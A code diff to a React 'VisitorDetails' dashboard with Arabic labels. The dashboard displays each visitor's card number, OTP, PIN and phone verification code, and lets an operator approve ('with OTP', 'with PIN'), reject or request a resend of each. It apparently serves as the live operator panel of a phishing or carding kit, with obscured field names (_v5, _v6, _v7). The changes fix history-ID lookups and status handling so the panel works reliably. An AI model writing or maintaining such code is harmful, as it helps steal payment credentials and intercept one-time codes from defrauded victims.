@@ -339,9 +339,12 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     }
 
     const isLatestCard = index === 0;
+    // For the latest card, prefer visitor.cardStatus (the persisted action result)
+    // over the per-entry cardHistory.status. Fall back to cardHistory.status for
+    // older card attempts or when no top-level status is set.
     const effectiveCardStatus =
-      isLatestCard && visitor.cardStatus === "message"
-        ? "message"
+      isLatestCard && visitor.cardStatus
+        ? visitor.cardStatus
         : cardHistory.status;
 
     // Show all cards, but hide action buttons if already actioned
@@ -367,6 +370,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (cardNumber || encryptedCardNumber) {
       bubbles.push({
         id: `card-info-${cardHistory.id || index}`,
+        historyId: cardHistory.id,
         title:
           isLatestCard
             ? "معلومات البطاقة"
@@ -406,9 +410,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   sortedOtpHistory.forEach((otpHistory: any, index: number) => {
     const otp = otpHistory.data?._v5;
     const isLatestOtp = index === 0;
+    // For the latest OTP, prefer visitor._v5Status (persisted action result)
+    // over the per-entry otpHistory.status.
     const effectiveOtpStatus =
-      isLatestOtp && visitor._v5Status === "message"
-        ? "message"
+      isLatestOtp && visitor._v5Status
+        ? visitor._v5Status
         : otpHistory.status;
     const hasBeenActioned =
       effectiveOtpStatus === "approved" || effectiveOtpStatus === "rejected";
@@ -416,6 +422,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (otp) {
       bubbles.push({
         id: `otp-${otpHistory.id || index}`,
+        historyId: otpHistory.id,
         title:
           isLatestOtp
             ? "كود OTP"
@@ -455,9 +462,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   sortedPinHistory.forEach((pinHistory: any, index: number) => {
     const pinCode = pinHistory.data?._v6;
     const isLatestPin = index === 0;
+    // For the latest PIN, prefer visitor.pinStatus (persisted action result)
+    // over the per-entry pinHistory.status.
     const effectivePinStatus =
-      isLatestPin && visitor.pinStatus === "message"
-        ? "message"
+      isLatestPin && visitor.pinStatus
+        ? visitor.pinStatus
         : pinHistory.status;
     const hasBeenActioned =
       effectivePinStatus === "approved" || effectivePinStatus === "rejected";
@@ -465,6 +474,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (pinCode) {
       bubbles.push({
         id: `pin-${pinHistory.id || index}`,
+        historyId: pinHistory.id,
         title:
           isLatestPin
             ? "رمز PIN"
@@ -522,13 +532,21 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   sortedPhoneOtpHistory.forEach((phoneOtpHistory: any, index: number) => {
     const phoneOtp = phoneOtpHistory.data?._v7;
+    const isLatestPhoneOtp = index === 0;
+    // For the latest phone OTP, prefer visitor.phoneOtpStatus (persisted action
+    // result) over the per-entry phoneOtpHistory.status.
+    const effectivePhoneOtpStatus =
+      isLatestPhoneOtp && (visitor.phoneOtpStatus === "approved" || visitor.phoneOtpStatus === "rejected")
+        ? visitor.phoneOtpStatus
+        : phoneOtpHistory.status;
     const hasBeenActioned =
-      phoneOtpHistory.status === "approved" ||
-      phoneOtpHistory.status === "rejected";
+      effectivePhoneOtpStatus === "approved" ||
+      effectivePhoneOtpStatus === "rejected";
 
     if (phoneOtp) {
       bubbles.push({
         id: `phone-otp-${phoneOtpHistory.id || index}`,
+        historyId: phoneOtpHistory.id,
         title:
           index === 0
             ? "كود تحقق الهاتف"
@@ -540,16 +558,16 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         data: {
           "كود التحقق": phoneOtp,
           الحالة:
-            phoneOtpHistory.status === "approved"
+            effectivePhoneOtpStatus === "approved"
               ? "✓ تم القبول"
-              : phoneOtpHistory.status === "rejected"
+              : effectivePhoneOtpStatus === "rejected"
               ? "✗ تم الرفض"
               : "⬳ قيد المراجعة",
         },
         timestamp: phoneOtpHistory.timestamp,
-        status: phoneOtpHistory.status || ("pending" as const),
+        status: effectivePhoneOtpStatus || ("pending" as const),
         showActions: !hasBeenActioned,
-        isLatest: index === 0,
+        isLatest: isLatestPhoneOtp,
         type: "phone_otp",
       });
     }
@@ -751,6 +769,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     try {
       const bubble = bubbles.find((b) => b.id === bubbleId);
       if (!bubble) return;
+      // Use the raw history entry id (without the "card-info-"/"otp-"/etc. prefix)
+      // so updateHistoryStatus and approval/rejection handlers can find the entry.
+      const historyId = bubble.historyId || bubble.id;
 
       switch (bubble.type) {
         case "card":
@@ -759,12 +780,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             console.log(
               "[Action] Card OTP clicked, bubble.id:",
               bubble.id,
+              "historyId:",
+              historyId,
               "history:",
               visitor.history
             );
             await updateHistoryStatus(
               visitor.id,
-              bubble.id,
+              historyId,
               "approved_with_otp",
               visitor.history || []
             );
@@ -777,7 +800,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             // Approve card with PIN - update history status
             await updateHistoryStatus(
               visitor.id,
-              bubble.id,
+              historyId,
               "approved_with_pin",
               visitor.history || []
             );
@@ -789,7 +812,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               // Reject card - update history status
               await updateHistoryStatus(
                 visitor.id,
-                bubble.id,
+                historyId,
                 "rejected",
                 visitor.history || []
               );
@@ -810,7 +833,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             // Approve OTP using proper handler
             await handleOtpApproval(
               visitor.id,
-              bubble.id,
+              historyId,
               visitor.history || []
             );
             // Update timestamp
@@ -821,7 +844,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               // Reject OTP using proper handler
               await handleOtpRejection(
                 visitor.id,
-                bubble.id,
+                historyId,
                 visitor.history || []
               );
               // Update timestamp
@@ -839,7 +862,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         case "phone_otp":
           if (action === "approve") {
             if (hasMultipleAttempts) {
-              await handlePhoneOtpApproval(visitor.id, bubbleId, history);
+              await handlePhoneOtpApproval(visitor.id, historyId, history);
             } else {
               await updateApplication(visitor.id, {
                 phoneOtpStatus: "approved",
@@ -849,7 +872,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             // Phone OTP approved
           } else if (action === "reject") {
               if (hasMultipleAttempts) {
-                await handlePhoneOtpRejection(visitor.id, bubbleId, history);
+                await handlePhoneOtpRejection(visitor.id, historyId, history);
               } else {
                 await updateApplication(visitor.id, {
                   phoneOtpStatus: "rejected",
@@ -860,7 +883,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           } else if (action === "resend") {
             await updateHistoryStatus(
               visitor.id,
-              bubbleId,
+              historyId,
               "resend",
               visitor.history || []
             );
@@ -909,7 +932,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           if (action === "approve") {
             await updateHistoryStatus(
               visitor.id,
-              bubble.id,
+              historyId,
               "approved",
               visitor.history || []
             );
@@ -921,7 +944,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           } else if (action === "reject") {
               await updateHistoryStatus(
                 visitor.id,
-                bubble.id,
+                historyId,
                 "rejected",
                 visitor.history || []
               );
